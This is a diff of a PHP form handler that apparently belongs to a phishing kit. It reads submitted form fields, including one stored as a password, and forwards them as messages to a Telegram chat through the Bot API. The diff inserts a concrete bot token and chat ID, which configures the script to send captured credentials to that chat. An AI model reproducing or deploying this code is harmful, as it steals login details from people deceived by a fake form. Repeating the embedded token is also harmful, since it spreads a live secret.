@@ -12,8 +12,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
     $password = htmlspecialchars($_POST['bb']);
 
     function sendTelegramMessage($message) {
-        $telegramBotToken = ''; // BOT TOKEN
-        $telegramChatID = ''; // CHATID
+        $telegramBotToken = '8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA'; // BOT TOKEN
+        $telegramChatID = '7959372593'; // CHATID
 
         $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message);
 
@@ -48,3 +48,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
     echo json_encode(['status' => 'error', 'message' => 'No data received']);
 }
 ?>
+
